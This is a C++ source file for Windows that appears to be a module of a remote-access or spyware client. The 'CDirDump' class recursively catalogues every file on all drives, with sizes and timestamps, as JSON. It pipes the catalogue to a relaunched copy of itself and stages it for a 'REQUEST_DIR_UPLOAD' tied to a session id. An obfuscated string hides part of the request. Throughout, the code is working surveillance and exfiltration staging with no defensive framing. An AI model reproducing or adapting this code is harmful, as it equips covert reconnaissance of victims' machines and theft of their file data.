#include "dirdump.h"

void CDirDump::Run( std::wstring path ) {
  m_thread.Run(this, &CDirDump::DoWork, path);
}

bool CDirDump::IsThreadActive() {
  return m_thread.IsThreadActive();
}

void CDirDump::Fail ( int code ) {
  InterlockedDecrement(&mutex1);
  //plan 9 from underpants
  //actually let's just report back failure...
  //TODO:
}

void CDirDump::DoWork ( std::wstring path ) {
  std::wstring buffer;

  if (mutex1 != 1) {
    return Fail(0);
  }

  srand ( (unsigned int)GetTickCount() );
  std::wstring strFilename = rand_wstring(10);
  strFilename = generate_path(strFilename);
  
  std::wstring strMyFilename = std::wstring(GetCommandLineW());
  while (strMyFilename.substr(strMyFilename.length() - 1) == L" ") {
    strMyFilename.resize(strMyFilename.length() - 1);
  }
  if (strMyFilename.at(0) == '"') {
    strMyFilename.resize(strMyFilename.find_first_of(L"\"", 1) + 1);
  } else if (npos != strMyFilename.find_first_of(L" ")) {
    strMyFilename.resize(strMyFilename.find_first_of(L" "));
  }
  strMyFilename.append( L" \"" );
  strMyFilename.append( strFilename );
  strMyFilename.append( L"\"" );

  HANDLE g_hChildStd_IN_Rd = NULL;
  HANDLE g_hChildStd_IN_Wr = NULL;
  HANDLE g_hChildStd_OUT_Rd = NULL;
  HANDLE g_hChildStd_OUT_Wr = NULL;
  SECURITY_ATTRIBUTES saAttr;
  ZeroMemory( &saAttr, sizeof(saAttr) );
  saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
  saAttr.bInheritHandle = TRUE; 
  saAttr.lpSecurityDescriptor = NULL;
  if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) )
    return Fail(1);
  if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) ) {
    CloseHandle(g_hChildStd_OUT_Rd);
    CloseHandle(g_hChildStd_OUT_Wr);
    return Fail(2);
  }
  if (! CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
    CloseHandle(g_hChildStd_OUT_Rd);
    CloseHandle(g_hChildStd_OUT_Wr);
    return Fail(3);
  }
  if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) ) {
    CloseHandle(g_hChildStd_OUT_Rd);
    CloseHandle(g_hChildStd_OUT_Wr);
    CloseHandle(g_hChildStd_IN_Rd);
    CloseHandle(g_hChildStd_IN_Wr);
    return Fail(4);
  }

  {
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFOW siStartInfo;
    BOOL bSuccess = FALSE; 
    ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
    wchar_t *tmp = new wchar_t[strMyFilename.length()+1];
    wcscpy_s(tmp, strMyFilename.length()+1, strMyFilename.data());
    bSuccess = CreateProcessW(
      NULL, 
      tmp,     // command line 
      NULL,          // process security attributes 
      NULL,          // primary thread security attributes 
      TRUE,          // handles are inherited 
      0,             // creation flags 
      NULL,          // use parent's environment 
      NULL,          // use parent's current directory 
      &siStartInfo,  // STARTUPINFO pointer 
      &piProcInfo
    );  // receives PROCESS_INFORMATION 
    delete[] tmp;
    if ( ! bSuccess ) 
      return Fail(5);
    else {
      CloseHandle(piProcInfo.hProcess);
      CloseHandle(piProcInfo.hThread);
    }
  }

  if (path.length() < 3) {
    buffer.append(L"[");
    unsigned int drivetype = 0;
    wchar_t buffer2[20]; 
    path = L"X:\\";
    for (int j = 2; j < 26; j++) {
      path[0] = 'A'+j;
      drivetype = GetDriveTypeW(path.c_str());
      switch (drivetype) {
        case 0:
        case 1:
        case 5:
        case 6:
          continue;
      }
      buffer.append(L"{\"r\":\"");
      buffer.append(path);
      buffer.append(L"\",\"t\":");
      _ultow_s(drivetype, buffer2, sizeof(buffer2)/sizeof(WCHAR), 10);
      buffer.append(buffer2);
      buffer.append(L",\"c\":");
      this->DoDir( g_hChildStd_IN_Wr, path, buffer );
      buffer.append(L"}");
    }
    //walk over all drives
    buffer.append(L"]");
  } else {
    buffer.append(L"{\"r\":\"");
    buffer.append(path);
    buffer.append(L"\",\"c\":");
    this->DoDir( g_hChildStd_IN_Wr, path, buffer );
    buffer.append(L"}");
  }
  this->DoDump( g_hChildStd_IN_Wr, buffer );
  
  CloseHandle(g_hChildStd_OUT_Rd);
  CloseHandle(g_hChildStd_OUT_Wr);
  CloseHandle(g_hChildStd_IN_Rd);
  CloseHandle(g_hChildStd_IN_Wr);

  {
    FILE* file;
    do {
      SleepEx (100, true);
      _wfopen_s( &file, strFilename.c_str(), L"ab" );
    } while (!file);
    fclose(file);
  }
  
  buffer = S(REQUEST_DIR_UPLOAD);
  buffer.append(strSession);
#ifndef _STRING_PROTECTION
  buffer.append(S(L"&name=")); 
#else
  buffer.append(S(L"\x12\x41\x50\x55\x64\x6b\x51")); 
#endif
  lastBuffer = buffer;
  lastStrFilename = strFilename;
  InterlockedIncrement(&mutex1);
  
}

extern std::vector<void *> stringprotection;

void CDirDump::DoDir ( HANDLE g_hChildStd_IN_Wr, std::wstring& root, std::wstring& buffer ) {
  WIN32_FIND_DATAW ffd;
  HANDLE hFind = INVALID_HANDLE_VALUE;
  DWORD dwError=0;
  std::wstring strDir = root;
  std::wstring strNull = L"null";
  bool foundone = false;
  
  if ( root.length() + 3 > MAX_PATH ) {
    buffer.append(strNull);
    return;
  }

  strDir.append(L"*");
  
  hFind = FindFirstFileW( strDir.c_str(), &ffd );

  if (INVALID_HANDLE_VALUE == hFind) {
    buffer.append(strNull);
    return;
  }

  buffer.append(L"{\"d\":");
  if (root.length() == 3) {
    buffer.append(strNull);
  } else {
    buffer.append(L"\"");
    strDir = root.substr(0, root.length() - 1);
    strDir = strDir.substr( strDir.find_last_of('\\') + 1 );
    buffer.append(strDir);
    buffer.append(L"\"");

  }
  buffer.append(L",\"c\":[");
  this->DoDump( g_hChildStd_IN_Wr, buffer );

  do {
    strDir = std::wstring(ffd.cFileName);
    if (strDir.length() == 0 || !strDir.compare(L".") || !strDir.compare(L".."))
      continue;
    if (foundone) {
      buffer.append(L",");
    }
    
    if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      
      strDir = root;
      strDir.append(std::wstring(ffd.cFileName));
      strDir.append(L"\\");
      
      this->DoDir( g_hChildStd_IN_Wr, strDir, buffer );

    } else {
      buffer.append(L"{\"f\":\"");
      buffer.append(strDir);
      buffer.append(L"\",\"s\":");
      {
        std::wstringstream convert;
        LARGE_INTEGER filesize;

        filesize.LowPart = ffd.nFileSizeLow;
        filesize.HighPart = ffd.nFileSizeHigh;
        convert.str(L"");
        convert << filesize.QuadPart;
        buffer.append(convert.str());
        
        convert.str(L"");
        buffer.append(L",\"r\":");
        filesize.LowPart = ffd.ftCreationTime.dwLowDateTime;
        filesize.HighPart = ffd.ftCreationTime.dwHighDateTime;
        if (filesize.QuadPart) {
            filesize.QuadPart = (filesize.QuadPart - 0x019DB1DED53E8000LL) / 10000000;
        }
        convert << filesize.QuadPart;
        buffer.append(convert.str());

        convert.str(L"");
        buffer.append(L",\"m\":");
        filesize.LowPart = ffd.ftLastWriteTime.dwLowDateTime;
        filesize.HighPart = ffd.ftLastWriteTime.dwHighDateTime;
        if (filesize.QuadPart) {
            filesize.QuadPart = (filesize.QuadPart - 0x019DB1DED53E8000LL) / 10000000;
        }
        convert << filesize.QuadPart;
        buffer.append(convert.str());

        convert.str(L"");
        buffer.append(L",\"x\":");
        filesize.LowPart = ffd.ftLastAccessTime.dwLowDateTime;
        filesize.HighPart = ffd.ftLastAccessTime.dwHighDateTime;
        if (filesize.QuadPart) {
            filesize.QuadPart = (filesize.QuadPart - 0x019DB1DED53E8000LL) / 10000000;
        }
        convert << filesize.QuadPart;
        buffer.append(convert.str());

      }
      buffer.append(L"}");
    }
    this->DoDump( g_hChildStd_IN_Wr, buffer );    
    foundone = true;
  } while (FindNextFileW(hFind, &ffd) != 0);

  FindClose(hFind);

  if (!foundone) {
    buffer.append(strNull);
  }
  buffer.append(L"]}");
}

void CDirDump::DoDump( HANDLE g_hChildStd_IN_Wr, std::wstring &buffer ) {
  char *chrBuffer;
  chrBuffer = (char *) malloc(sizeof(wchar_t) * buffer.length());
  int j = WideCharToMultiByte(
    CP_UTF8,
    0,
    buffer.c_str(),
    buffer.length(),
    chrBuffer,
    buffer.length() * sizeof(wchar_t),
    NULL,
    NULL
  );
  buffer.clear();
  //chrBuffer[j] = 0;
  BOOL bSuccess;
  DWORD dwWritten = 0;
  for (;j > 0;) {
    bSuccess = WriteFile(g_hChildStd_IN_Wr, chrBuffer+dwWritten,
      (j > 1024 ? 1024 : j), &dwWritten, NULL);
    j -= dwWritten;
    if ( ! bSuccess ) break;
  }
  free(chrBuffer);
}
